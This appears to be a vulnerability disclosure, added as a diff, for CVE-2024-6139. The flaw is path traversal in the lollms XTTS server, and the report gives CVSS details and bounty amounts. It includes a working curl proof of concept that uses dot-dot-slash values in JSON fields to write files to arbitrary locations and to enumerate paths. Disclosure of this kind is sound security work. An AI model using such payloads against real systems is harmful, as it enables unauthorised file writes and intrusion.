@@ -1,0 +1,30 @@
+Title: Dot-dot-slash path traversal in XTTS server in parisneo/lollms
+
+Proof of Concept: 
+curl -X POST -H "Content-Type: application/json" -d '{"text": "Hello, world!", "speaker_wav": "../../../services/xtts/voices/main_voice.wav", "language": "en", "file_name_or_path": "../../../../../../../../../../../../../../../../home/elias/HACKED.wav"}' http://localhost:8020/tts_to_file
+
+This will write a wav file to an arbitrary location on the system. It is also possible enumerate file paths (an error message will be shown if the speaker voice file does not exist)
+
+Note: If the exploit does not work, it may be necessary to install and start the XTTS system using /install_xtts and /start_xtts endpoins, which should launch the server on port 8020. On my system, I also had to patch the python executable path in ./lollms-webui/scripts/linux/lollms-webui/lollms_core/lollms/utilities.py to python_path = Path(sys.executable).parent.parent.parent/"miniconda3"/"envs"/env_name/"bin"/"python" to make the installation succeed.
+
+Impact: 
+This vulnerability can be abused to write audio files compatible with XTTS to arbitrary locations on the system, and also enumerate such file paths on the system.
+
+CVE ID: CVE-2024-6139
+Status: (published)
+Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+Severity: High (7.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: Low
+Integrity: Low
+Availability: Low
+Registry: Other
+Affected Version: v9.6
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
